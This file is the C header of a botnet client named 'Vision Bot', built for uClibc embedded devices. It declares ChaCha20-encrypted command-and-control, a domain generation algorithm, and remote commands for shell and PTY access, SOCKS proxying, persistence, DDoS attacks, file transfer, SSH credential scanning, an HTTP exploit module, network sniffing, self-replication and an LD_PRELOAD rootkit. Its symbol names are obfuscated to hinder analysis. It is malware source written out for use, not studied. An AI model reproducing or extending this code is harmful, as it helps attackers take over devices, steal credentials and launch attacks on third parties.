#ifndef BOT_H
#define BOT_H
/*
 * Vision Bot — Pure C (GCC 4.1.2 / uClibc)
 * Encrypted TCP via ChaCha20 stream cipher. Zero external deps.
 */

/* Safety defines for minimal uClibc toolchains */
#ifndef NULL
#define NULL ((void*)0)
#endif
#ifndef __SIZE_TYPE__
#define __SIZE_TYPE__ unsigned long
#endif
typedef __SIZE_TYPE__ size_t;

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <poll.h>
#include <sys/ioctl.h>

#ifdef __linux__
#include <sys/sysinfo.h>
#endif

#include "strenc.h"

/* Safe memory zeroing — survives compiler optimization */
#ifndef HAVE_EXPLICIT_BZERO
static void volatile_memzero(void *ptr, size_t len) {
    volatile uint8_t *p = (volatile uint8_t *)ptr;
    while (len--) *p++ = 0;
}
#define explicit_bzero volatile_memzero
#endif

/* ======================================================================
   DYNAMIC STRING (replaces std::string)
   ====================================================================== */

typedef struct {
    char*  buf;
    size_t len;
    size_t cap;
} dstr;

void   ds_init(dstr* s);
void   ds_free(dstr* s);
void   ds_set(dstr* s, const char* str);
void   ds_setn(dstr* s, const char* str, size_t n);
void   ds_cat(dstr* s, const char* str);
void   ds_catn(dstr* s, const char* str, size_t n);
void   ds_catc(dstr* s, char c);
void   ds_catds(dstr* s, const dstr* other);
void   ds_clear(dstr* s);
int    ds_empty(const dstr* s);
int    ds_eq(const dstr* s, const char* str);
int    ds_eqds(const dstr* s, const dstr* other);
size_t ds_find(const dstr* s, const char* needle, size_t start);
dstr   ds_sub(const dstr* s, size_t pos, size_t n);
char   ds_back(const dstr* s);
void   ds_pop(dstr* s);
dstr   ds_from(const char* str);

/* inline accessor */
#define ds_cstr(s) ((s)->buf ? (s)->buf : "")
#define ds_len(s)  ((s)->len)

/* ======================================================================
   DYNAMIC BYTE ARRAY (replaces std::vector<uint8_t>)
   ====================================================================== */

typedef struct {
    uint8_t* data;
    size_t   len;
    size_t   cap;
} dbuf;

void   db_init(dbuf* b);
void   db_free(dbuf* b);
void   db_push(dbuf* b, uint8_t byte);
void   db_append(dbuf* b, const uint8_t* data, size_t n);
void   db_setn(dbuf* b, const uint8_t* data, size_t n);
void   db_reserve(dbuf* b, size_t cap);
void   db_clear(dbuf* b);
#define db_ptr(b)  ((b)->data)
#define db_len(b)  ((b)->len)

/* ======================================================================
   STRING ARRAY (replaces std::vector<std::string>)
   ====================================================================== */

typedef struct {
    dstr*  items;
    size_t count;
    size_t cap;
} strarr;

void   sa_init(strarr* a);
void   sa_free(strarr* a);
void   sa_push(strarr* a, const char* s);
void   sa_pushds(strarr* a, const dstr* s);
void   sa_clear(strarr* a);
void   sa_shuffle(strarr* a);
void   sa_insert(strarr* dst, const strarr* src);
#define sa_get(a, i) ds_cstr(&(a)->items[i])
#define sa_count(a)  ((a)->count)

/* ======================================================================
   ENCRYPTED TCP CONNECTION
   ====================================================================== */

typedef struct {
    uint8_t  key[32];
    uint32_t nonce[3];
    uint32_t counter;
    uint8_t  ks[64];
    int      ks_pos;
} _yJ6fE3k;

typedef struct {
    int            fd;
    int            valid;
    _yJ6fE3k send_cipher;
    _yJ6fE3k recv_cipher;
    uint8_t        hmac_key[32];
    /* authenticated frame receive buffer */
    uint8_t       *rbuf;
    size_t         rbuf_len;
    size_t         rbuf_pos;
} _EA8up4M;

/* ======================================================================
   SHA-256 STREAMING CONTEXT
   ====================================================================== */

typedef struct {
    uint32_t state[8];
    uint8_t  buf[64];
    size_t   buf_len;
    uint64_t total;
} _BW4EK8x;

void _tP5sQ3C(_BW4EK8x* c);
void _iS7pL8N(_BW4EK8x* c, const uint8_t* data, size_t len);
void _Vd5Ph6z(_BW4EK8x* c, uint8_t out[32]);

/* ======================================================================
   CONSTANTS
   ====================================================================== */

/* Sentinel values read by setup.py — actual runtime values come from encrypted config blobs below */
#define CONFIG_SEED         "8e1ac3a7"
/* SYNC_TOKEN is now decrypted at runtime from config.c — see _Lv3Qk8T */
#define BUILD_TAG           "r1.1-stable"
#define DGA_TLD             ".xyz"
#define DGA_DOMAINS_PER_DAY 20
#define MAX_SESSIONS        100
#define RETRY_FAST_FLOOR_MS 2000
#define RETRY_FAST_CEIL_MS  4000
#define RETRY_RAMP_BASE_MS  5000
#define RETRY_RAMP_MAX_MS   30000
#define PHANTOM_RETRY_MS    120000
#define CTRL_PORT           42780   /* localhost port for single-instance control */


/* Binary command protocol: [0xFF magic][cmd_id:1][args_len:2 BE][args:N] */
#define CMD_MAGIC           0xFF
#define CMD_SHELL           0x01
#define CMD_STREAM          0x02
#define CMD_DETACH          0x03
#define CMD_INFO            0x04
#define CMD_SOCKS           0x05
#define CMD_STOPSOCKS       0x06
#define CMD_SOCKSAUTH       0x07
#define CMD_PTY             0x08
#define CMD_PTYDATA         0x09
#define CMD_PERSIST         0x0A
#define CMD_ATTACK          0x0B
#define CMD_STOPATTACK      0x0C
#define CMD_REINSTALL       0x0D
#define CMD_KILL            0x0E
#define CMD_EXIT            0x0F
#define CMD_UPDATEFETCH     0x10
#define CMD_DOWNLOAD        0x1C
#define CMD_UPLOAD          0x1D
#define CMD_SSH             0x20
#define CMD_STOPSSH         0x21
#define CMD_HTTP            0x22
#define CMD_STOPHTTP        0x23
#define CMD_SNIFF           0x24
#define CMD_STOPSNIFF       0x25
/* CMD_REDIS/PGSQL/MYSQL removed — these scanners are handled by brutus */

/* ======================================================================
   GLOBAL STATE
   ====================================================================== */

extern int g_verbose;

extern dstr _yg5RE4m, _dG3DF2X, _ZC6YY5F, _my4vH6P;
extern int64_t _GL4jD4V;
extern int     _Ym3DC2v;
extern double  _yD4HC3W;

extern dstr _yr2Dc6W, _uv4SZ5A;
extern pthread_mutex_t _kL3Yy7R;

extern int _ib2tD7y;                /* single-instance control listener socket */
extern volatile int _bS6gN5R, _EE6MZ7b, _bg6ay7T;
extern dstr _dz3vg3W;
extern pthread_mutex_t _NQ8CE5p;
extern int _JN8xm6T;

extern strarr _zU4TP2B;
extern strarr _fq5Hh7H, _GT2zC6e, _fx8Fz7F;
extern strarr _ZR2yx2H, _oE2jB5C, _zR8sK4g;
extern strarr _xJ8ym8N;
extern strarr _Ds7cV2u, _wP7xV7q;

extern dstr _CT6sh3M, _so3eq8T;
extern dstr _Xw5Jp4W, _UW4jD7J, _xT8zC3K, _Cs5Qb7D;
extern dstr _BS3jN3L, _PZ7PR8b, _zP2mv4Y, _rM3Ck5U, _aZ2XV2A;
extern dstr _yj8Yv4L, _cd2pA4A, _aN8Lh6d, _ch7HN7W;
extern dstr _Pi5LD4t, _KB5jb2q, _QC2kf6S;
extern dstr _fp7cd2e, _gp5vZ6k, _nE6py4K, _QS4Kn2u;
extern dstr _Ag2PA3Y, _sq2vi4d;
extern dstr _yh8Vu8D, _VD7BQ4c, _mi6YG6d;
extern dstr _KZ7LL3b, _Vm7uC8w, _HH8Az2g;
extern dstr _hb6Aa4L, _zR8oC6c, _hD4fS7K;
extern dstr _cJ8BU8L, _am5bJ3X;
extern dstr _jy7Ho4s, _oD3KN5M, _da6QF2F;
extern dstr _Ep3ej3c, _eB7YC8M;
extern dstr _Uj4hP7a, _Ve2pe8n, _Qt5Ey5X;
extern dstr _zu2uc2Y, _iG6pj2F;
extern dstr _Xx5Rw4X;
extern dstr _my6pz2j;
extern dstr _mW2ZD2g;
extern const char *_Gy7MD4D;
extern dstr _Lv3Qk8T;  /* decrypted sync token (was SYNC_TOKEN #define) */
extern dstr _gC8se3d;   /* config seed  (was CONFIG_SEED #define) */
extern dstr _bT4ag3x;   /* build tag    (was BUILD_TAG #define)   */
extern dstr _dT5lg2z;   /* DGA TLD      (was DGA_TLD #define)     */
extern dstr _sB8nn3r;   /* SSH client banner                       */

/* ======================================================================
   ATOMIC HELPERS
   ====================================================================== */

extern pthread_mutex_t _DC3Uh8E;
int  at_load(volatile int* p);
void at_store(volatile int* p, int v);
int  at_inc(volatile int* p);
int  at_dec(volatile int* p);

/* ======================================================================
   UTILITY
   ====================================================================== */

#ifdef DEBUG
void   _nS5PJ8Y(const char* fmt, ...);
#else
#define _nS5PJ8Y(...) ((void)0)
#endif
void   urandom_bytes(uint8_t* out, size_t len);
uint32_t urandom_u32(void);
char*  int_to_str(int n);         /* returns static buf, NOT thread-safe for concurrent use */
char*  i64_to_str(int64_t n);
void   sleep_ms(int ms);
void   sleep_jitter(int floor_ms, int ceil_ms);
int    jitter_ms(int floor_ms, int ceil_ms);
void   random_string(char* out, int n);

/* ======================================================================
   CRYPTO
   ====================================================================== */

dbuf   _wu2rB4w(const char* hex);
dstr   _dJ2Bc5Y(const uint8_t* data, size_t len);
dstr   _uA7kc2G(const uint8_t* data, size_t len);
dbuf   _rr5LH7D(const char* encoded);
dbuf   _pa8hk5h(const uint8_t* data, size_t len);
dbuf   _Ug8Lk6u(const char* s);
dbuf   _Uk7sK7L(const uint8_t* blob, size_t len);
dbuf   _xf5uT6g(const uint8_t* data, size_t len, const uint8_t* raw_key, size_t klen);
dbuf   _iW7Tx4Y(const uint8_t* blob, size_t len);
dbuf   _PP4rn3w(const uint8_t* blob, size_t len);
dbuf   _tf7PF5b(const char* seed);
dstr   _Kd6BF5m(const char* encoded);
dstr   _Xe8Yw5c(const char* challenge, const char* secret);

void   _Yh4kQ4V(const uint32_t input[16], uint8_t output[64]);
void   _BV3cU8N(_yJ6fE3k* cs, const uint8_t key[32]);
int    _gF6Fb8W(_yJ6fE3k* cs, uint8_t* data, size_t len);
void   _no3nm7v(const uint8_t *key, size_t key_len,
                   const uint8_t *msg, size_t msg_len, uint8_t out[32]);
void   _aw4Ma4u(uint8_t q[32], const uint8_t n[32], const uint8_t p[32]);
void   _go6pR4p(uint8_t q[32], const uint8_t n[32]);

/* ======================================================================
   CONFIG
   ====================================================================== */

void iB2Zq4a(void);
void xM3Hd6X(void);
void Ng4eX6x(void);
void DS4RR2W(void);
void Ri2bh5v(void);
void PP3yJ4J(void);

/* ======================================================================
   OPSEC
   ====================================================================== */

void   uQ5tH2B(int argc, char **argv);
int    VA3rJ6j(void);
void   Ai2mW7K(dstr* out);
int    Bp3Tq8Z(void);
void   Xy5oR2j(dstr* out);
int64_t HY8cY3Q(void);
int    un5KE2K(void);
void   uw2zs4U(dstr* out);
double Gm3pk8i(void);
void   HZ8hr8M(void);

/* ======================================================================
   CONNECTION
   ====================================================================== */

typedef struct { dstr host; dstr port; } _qw5Ti5p;

int      gv4Kv3u(const char* addr, dstr* host, dstr* port);
_EA8up4M*  hq4zK8c(const char* host, const char* port);
void     ZR8pH4D(_EA8up4M* c);
dstr     Un4Ss4D(_EA8up4M* c, int timeout_sec);
int      nb2Fg4N(_EA8up4M* c, int timeout_sec);
int      AF6jH4z(_EA8up4M* c, void* buf, size_t n, int timeout_sec);
void     Jf8pY4F(_EA8up4M* c, const char* data, size_t len);
void     Ng2ZR5y(_EA8up4M* c, const char* str);

int      SZ2yL5g(const char* h);
strarr   kS6pU7n(const char* data);
strarr   Vc2mZ5Q(const char* data);
strarr   Dc6Mh8n(const char* domain, const char* server);
strarr   mQ2Yw7j(const char* domain);
strarr   LF5UQ4v(const char* domain);
strarr   Go3xC6n(const char* domain);
dstr     DR4Wt6N(const char* domain);
strarr   Fc7FE8v(const char* decoded);
strarr   dH7QB8j(int idx);
void     Bp6se4h(int index, dstr* domain_out, dstr* port_out);
dstr     xu4si4C(const char* domain);
void     Ht7Lk2Y(_EA8up4M* c);
dstr     eS2nM4J(const char* url, int timeout_sec);

/* ======================================================================
   COMMANDS
   ====================================================================== */

int  CS6Ko7t(_EA8up4M* c, const char* command);
int  yD8Ug8t(_EA8up4M* c, uint8_t cmd_id, const char* args);
dstr Kc5Lw2k(const char* cmd);
void YS5EH8a(const char* cmd);
void bn5GN4t(const char* cmd, _EA8up4M* c);
void Pz9Pty4W(_EA8up4M* c);           /* PTY open — spawn shell */
void Ry3PtyIn(const char* data, size_t len);  /* PTY input — write to master fd */

/* ======================================================================
   PERSISTENCE
   ====================================================================== */

void Dc2YM5y(void);
void NK6pB7A(const char* hidden_dir);
int  Zp8bU5j(void);  /* returns 1 if systemd available, 0 otherwise */
void DB2Ve6Z(void);
void AJ3ue7Q(void);

/* ======================================================================
   SOCKS
   ====================================================================== */

int  jw8CH7B(const char* port, _EA8up4M* c2);
int  MA2zo8a(const char* host, const char* port, _EA8up4M* c2);
void tV4Lm4J(void);
void ac8JR6M(int client_fd);

/* ======================================================================
   SSH CREDENTIAL SCANNER
   ====================================================================== */

#ifndef NO_SELFREP
extern int _bj8XN2t;
extern int _SV2eW7e;   /* read end of pipe — child writes hits here */
void kh8hL4N(const char *b64_payload, _EA8up4M *parent_conn);
void Ss3vb6a(void);

/* HTTP EXPLOIT MODULE */
extern int _AR2yQ6h;
extern int _NG8vu2i;
void St3TW4o(const char *b64_payload);
void Gc5wq8T(void);

/* NETWORK SNIFFER */
extern int _sn7PK3z;
extern int _sn3ST8f;   /* read end of stats pipe — child writes counters here */
void sniffer_init(const char *logpath);
void sniffer_kill(void);



/* ROOTKIT (LD_PRELOAD) */
void vF6ku2D(const char *b64_so);
void uB5TJ8d(void);
void LG2Bv6i(void);  /* auto-activate if .so already on disk */


#endif /* NO_SELFREP */

#endif /* BOT_H */
